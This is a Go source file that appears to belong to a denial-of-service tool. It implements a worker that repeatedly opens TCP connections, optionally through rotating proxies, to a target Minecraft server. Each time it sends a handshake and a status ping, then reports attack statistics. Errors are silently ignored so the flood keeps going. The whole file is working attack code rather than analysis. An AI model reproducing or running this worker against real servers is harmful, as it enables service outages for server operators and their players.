package game

import (
	"bytes"
	"context"
	"encoding/binary"
	"io"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/netutil"
)

type mcPingWorker struct{}

func NewPingWorker() *mcPingWorker { return &mcPingWorker{} }

// Fire performs a Minecraft status ping (handshake + status request) over TCP, optionally via proxy.
func (w *mcPingWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	tn := params.TargetNode
	host := tn.Hostname()
	port := tn.PortNum()
	// If no scheme and default 80, prefer Minecraft default port
	if tn.Scheme == "" && port == 80 {
		port = 25565
	}

	var pptr *core.Proxy
	if p.Host != "" {
		pptr = &p
	}
	conn, err := netutil.DialedTCPClient(ctx, "tcp", host, port, pptr)
	if err != nil {
		return nil
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(3 * time.Second))

	// Send log only if connection was successful and verbose is enabled
	core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)

	// Build handshake packet for status state
	// Packet ID 0x00, Protocol Version (use 754), Server Address, Server Port, Next State (1 = status)
	const protoVersion = 754
	var pkt bytes.Buffer
	pkt.WriteByte(0x00)                                // packet id
	writeVarInt(&pkt, protoVersion)                    // protocol version
	writeString(&pkt, host)                            // server address
	binary.Write(&pkt, binary.BigEndian, uint16(port)) // server port
	writeVarInt(&pkt, 0x01)                            // next state: status

	// Prefix with length varint
	var framed bytes.Buffer
	writeVarInt(&framed, pkt.Len())
	framed.Write(pkt.Bytes())

	// Send handshake
	if _, err := conn.Write(framed.Bytes()); err != nil {
		return nil
	}

	// Status request: packet id 0x00 with length 1
	if _, err := conn.Write([]byte{0x01, 0x00}); err != nil {
		return nil
	}

	// Read a small portion of the response and discard
	// This prevents proxy/server buffers from clogging but avoids blocking long
	buf := make([]byte, 256)
	conn.Read(buf)
	io.CopyN(io.Discard, conn, 64)
	return nil
}

func writeVarInt(w io.ByteWriter, value int) {
	// Minecraft VarInt encoding
	for {
		b := byte(value & 0x7F)
		value >>= 7
		if value != 0 {
			b |= 0x80
		}
		w.WriteByte(b)
		if value == 0 {
			break
		}
	}
}

func writeString(buf *bytes.Buffer, s string) {
	writeVarInt(buf, len(s))
	buf.WriteString(s)
}
